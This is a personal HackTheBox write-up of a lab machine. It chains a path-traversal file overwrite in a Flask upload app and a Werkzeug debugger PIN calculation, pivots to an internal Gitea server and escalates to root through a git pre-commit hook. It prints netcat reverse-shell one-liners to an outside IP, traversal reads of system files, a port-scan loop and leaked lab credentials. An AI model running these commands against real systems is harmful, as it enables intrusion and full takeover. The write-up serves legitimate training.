HackTheBox
# Scan
![[Pasted image 20240330110743.png]]
# Ennumeration

![[Pasted image 20240330190700.png]]

As we found a website lo load files, we try uploading a php file but it's not executed
![[Pasted image 20240330191044.png]]

When nothing is loaded, we see a internal path
![[Pasted image 20240330190931.png]]

We can download a file too from the site which contains codes a .git files.
By using `7z l code.zip` we can see files before unzip it.

## Github project enumeration
[[Git Logs Analysis]]
We can see the logs of the project to verify the historical commits of the project
`git log`
![[Pasted image 20240330191658.png]]

## Dockers enumeration
We found a Dockerfile which update a directory
![[Pasted image 20240330191944.png]]

viewing config/supervisord.conf
![[Pasted image 20240330192144.png]]

We can infer that root is who running this container.

# Exploiting the Container

## 1st way: Local File Inclusion
[[File Inclusion]]

View.php
![[Pasted image 20240330195023.png]]IT's the code of uploading a file. Intercepting in burpsuit:

![[Pasted image 20240330195847.png]]

Comparing to the code:
file_name is the name of the file and "uploads" is the directory.
Analyzing how file_name is called, there is an import form other *utils.py* which executes a sanitization by replacing special characters by the user
![[Pasted image 20240330200306.png]]

### Bypassing File inclusion sanitization

#### Testing parameters
With no filename, there is an error showing the full path
![[Pasted image 20240330200420.png]]

Using *..* we see an error too nut it's recongnized:
![[Pasted image 20240330200527.png]]
With *../* it's not the case. Same with *....//*
![[Pasted image 20240330200554.png]]

#### Testing in python function os.path.join

It joins strings to create a path. *get.cwd* gets the current path os the host
`os.path.join(os.getcwd(),"public","uploads","test.txt")`

![[Pasted image 20240330200848.png]]

However if we put in the last parameter */test.txt*, the function doesn't consider the previous path
![[Pasted image 20240330201022.png]]

In the application, changing the name of the directory by starting with */*, we probably upload the file in a desire path.

#### Testing in the application
It seems it worked
 ![[Pasted image 20240330201436.png]]

So, we can try now to upload a modified *views.py* file in */app/app* directory to replace the old one existing.

#### Getting a Shell
Creating a new path to be called by curl, we can take avantage os *os* library to use *os.system* and by using a command to generate a reverse shell with netcat

Ref: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

For old versions:

![[Pasted image 20240330202233.png]]
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.70 1234 >/tmp/f`

![[Pasted image 20240330203829.png]]

Loading the file *views.py* file by chanfging his name to */app/app/views.py* - absolute path of application files. It seems it worked
![[Pasted image 20240330202759.png]]
listening of port 1234 and doing a curl the */shell* path
`nc -lnvp 1234`
`curl http://10.10.11.164/shell`

![[Pasted image 20240330203959.png]]

Use Interactive shell commands to improve this shell.

## 2nd way: Exploiting Werkzeug server
[[Werkzeug PIN bypass]]
By taking advantage of Local File Inclusion, we can guess a PIN console access:
Enumerating files
`wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.164/FUZZ`

![[Pasted image 20240331071937.png]]

We found console path which as for a PIN
![[Pasted image 20240331072108.png]]
#### Verifying if PIN harcoded

`grep -r -i "PIN" --text| grep -v css --text`

But we don't have anything interesting

### Exploiting already found LFI
As we have access to server files by using *//* 
For example:
`curl http://10.10.14.70/uploads/..//etc/passws --path-as-is`
- --path-as-is consider the url as is not removing extra / or ../
- the payload considers *..//* since sanitizaiton process cleans one *../* resting /etc/passwd that by ***os.path.join*** consider as a absolute path

Same in **Burpsuite**:
![[Pasted image 20240331104051.png]]

### Exploiting:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

![[Pasted image 20240331104239.png]]


Considering that script to bypass PIN, as we have file access, we can calculate the PIN based on the server.
As flask application runs *root* permissions, we can now try to get the MAC and ID needed:

 **Flask directory:**
`/usr/local/lib/python3.10/site-packages/flask/app.py`
![[Pasted image 20240331104642.png]]

**MAC into decimal format**
`curl http://10.10.11.164/uploads/..//sys/class/net/eth0/address --path-as-is` */sys/class/net is giving in the guide and eth0, we observed before as name of the interface machine*
>02:42:ac:11:00:08

![[Pasted image 20240331105222.png]]
In decimal is *2485377892360*

**Machine ID**
We use `/proc/sys/kernel/random/boot_id`
`curl http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id --path-as-is --ignore-content-length` *ignore content length since by default the response expects to show the same number of characters that flag content-length shows*

In **burpsuite**
![[Pasted image 20240331105721.png]]
>7aebcab0-a7e9-4dbd-8ae9-b027b581bac6

**Proc self group**
`/proc/self/cgroup`
![[Pasted image 20240331105836.png]]

>a98babd3fa226e2d5a753a47d7ae2bb1e3e8ad08d1d45eb17016a4e655806a09

adding it to machineid value
>7aebcab0-a7e9-4dbd-8ae9-b027b581bac6a98babd3fa226e2d5a753a47d7ae2bb1e3e8ad08d1d45eb17016a4e655806a09

![[Pasted image 20240331110416.png]]

Executing this code in python3, we will get a pin:
`python3 pinbypass.py`
>180-140-158

Now we can have access to the console.
**Note:** If it's not working, we can change the hashing used from *md5* to *sha1* or vise versa, depending is the version o the web server.
![[Pasted image 20240331110639.png]]
### Reverse shell in console
#### Testing the console
We can import os and execute commands directly
![[Pasted image 20240331110745.png]]

`os.popen("whoami").read().strip()`

#### Executing reverse shell
We use the same reverse shell used before with nc and sh
payload:
`os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.70 1234 >/tmp/f").read().strip()`
![[Pasted image 20240331111008.png]]
Listening in 1234 port we get the shell
`attaker$nc -lnvp 1234`

# Looking into internal ressources

### Looking for other users in the container
`ps -fa` *-a shows information about the processes and -f list all of them*

All processes are root.

### Analyzing Git logs
[[Git Logs Analysis]]
Analyzing project *dev* int the source code downloaded:

We found credentials in commit to access to an unknown server 10.10.10.128
*a76f8f75f7a4a12b706b0cf9c983796fa1985820*
![[Pasted image 20240331112909.png]]

>dev01:Soulless_Developer#2022

it seems there is an user dev01 since there is a directory home.
Testing by ssh it doesn't work since we need a private to access by password:
![[Pasted image 20240331113255.png]]

### Guessing main machine IP
By default IP of main machine is the first one.
Our IP in the container is 172.17.0.8, so we can try to reach to *172.17.0.1*

![[Pasted image 20240331113817.png]]

### Scanning main machine port
Using *netcat* we can scan ports open face to the container:
`for port in $(seq 1 10000); do nc 172.17.0.1 $port -zv; done`

Port 3000 is open, we can test if this an web service:

container$ wget http://172.17.0.1:3000 -qO- *last parameter to show only the souce code, without download index.html*

It's seems a Gitea service:
![[Pasted image 20240331114355.png]]

To get access to this web site, we can perform a portforwarding by using chisel:
![[Pasted image 20240331134322.png]]
Now we can have access to internal resouce
![[Pasted image 20240331134642.png]]

Using *dev01* credentials, we've got access to this site
![[Pasted image 20240331134931.png]]

Exploring, a private key if found which can be used to get access by ssh to the main machine
`chmod 600 id_rsa`
`ssh -i id_rsa dev01@10.10.11.164`

# Privilege Escalation

Finding files with SUID permissions
`find / \-perm -4000 2>/dev/null`

Not an interessting service.

### Looking for scheduled commands running


by using `ps -eo command`, it's possible to list all commands running in that moment in the machine

#### Script to automatize the process

`#!/bin/bash`
`old_process = $(ps -eo command)`

`while true; do`
	`new process=$(ps -eo command)`
	`dif<(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker"`
	`old_process=$new_process`
`done`

We see that there are a con process which executes a git-sync file
![[Pasted image 20240331142005.png]]

![[Pasted image 20240331142040.png]]`

This process get into /home/dev01 file and update a git commit backup
![[Pasted image 20240331143155.png]]

### Git hook exploitation
[[Git hooks]]
Creating a pre-commit hook to grant SUID permissions to bash
`echo 'chmod u+s /bin/bash' > ~/.git/hooks/pre-commit`
`chmod +x ~/.git/hooks/pre-commit`

When commit process will be executed, our pre-commit file will be executed as well.

To monitor if this works, we can use watch command to verify each 1 second if its changes:

`watch -n 1 ls -l /bin/bash`

![[Pasted image 20240331145918.png]]

Now we can cast `bash -p`